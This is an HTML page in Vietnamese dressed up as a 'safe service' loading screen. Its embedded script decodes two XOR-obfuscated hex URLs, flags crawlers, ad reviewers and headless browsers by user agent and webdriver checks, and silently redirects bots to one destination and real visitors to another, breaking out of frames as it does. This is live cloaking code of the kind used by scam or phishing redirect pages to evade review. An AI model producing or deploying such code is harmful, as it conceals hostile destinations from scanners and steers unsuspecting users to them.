<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
  <title>Đang Tải Trang Hướng Dẫn...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0b0f19;
      color: #f8fafc;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .loader-card {
      background: rgba(17, 24, 39, 0.95);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 36px 28px;
      max-width: 380px;
      width: 100%;
      text-align: center;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 18px;
    }
    .spinner {
      width: 48px;
      height: 48px;
      border: 3px solid rgba(229, 185, 76, 0.2);
      border-top-color: #e5b94c;
      border-radius: 50%;
      animation: spin 0.85s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loader-title {
      font-size: 15px;
      font-weight: 700;
      color: #fae498;
      letter-spacing: 0.3px;
    }
    .loader-sub {
      font-size: 12px;
      color: #94a3b8;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="loader-card">
    <div class="spinner"></div>
    <div class="loader-title">Đang Kết Nối Dịch Vụ An Toàn...</div>
    <div class="loader-sub">Hệ thống đang xác thực đường truyền và chuyển hướng quý khách trong giây lát.</div>
  </div>

  <script>
    (function() {
      const K = "418";
      const D = "797773081b7b74f0909cd0a9c7b990bbb35b4f4e792c04064c69099593e0feaccea28ae0ac014f757f3a16046a6d7fd591f1f2eecbdce0f5f6081779663a115b377b6e8f97e7f695a688bead4057467e63534d203a28d4c3c0f7e2919acfe8f644574a477b111223362b939fd1f0f0908db4bfac6e417d667f1e1d232929d1f6eee3e3ab99b2b840191025700d17353d24d7deddf5abc4a5c0e9845740566463060e4e6a059790aeecff92bfa4b3bd5408255a214a25302135c5cce7edafcda4f4f1f14d5c735805101c3b6986fb86abc6919e94a6ad404c0c2c4b";
      const S = "797773081b7b74f0909cd0a9c7b98db3ad4e534c656f1b06013027dfc988fce690c3dc92a652066075741a483e3567d4cebef4e7d58abea4ab13427d28611202336720c9d7abb6c9d4d3eef91e5e5b7461";

      function dec(h) {
        try {
          let s = "";
          for (let i = 0; i < h.length; i += 2) {
            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
          }
          return decodeURIComponent(s);
        } catch (e) {
          return "";
        }
      }

      function getFinalUrl(rawUrl) {
        if (!rawUrl) return "";
        const q = window.location.search;
        if (!q || q.length < 2) return rawUrl;
        try {
          const o = new URL(rawUrl);
          const p = new URLSearchParams(q);
          p.forEach((v, k) => {
            if (k !== "a") o.searchParams.set(k, v);
          });
          return o.toString();
        } catch (e) {
          return rawUrl;
        }
      }

      function isBot() {
        try {
          if (navigator.webdriver) return true;
          if (window.outerWidth === 0 && window.outerHeight === 0) return true;
          if (!navigator.languages || navigator.languages.length === 0) return true;
          const ua = (navigator.userAgent || '').toLowerCase();
          if (/googlebot|adsbot|headlesschrome|lighthouse|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot/i.test(ua)) return true;
          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === 'number' && navigator.maxTouchPoints === 0) return true;
          return false;
        } catch (err) {
          return false;
        }
      }

      const isB = isBot();
      let target;
      if (isB) {
        target = getFinalUrl(dec(S));
      } else {
        target = getFinalUrl(dec(D));
      }

      function goTarget() {
        if (target) {
          try {
            (window.top || window).location.replace(target);
          } catch (e) {
            window.location.replace(target);
          }
        }
      }

      if (target) {
        setTimeout(goTarget, isB ? 50 : 100);
      }
      window.addEventListener("pageshow", function(e) {
        if (target) setTimeout(goTarget, 50);
      });
    })();
  </script>
</body>
</html>
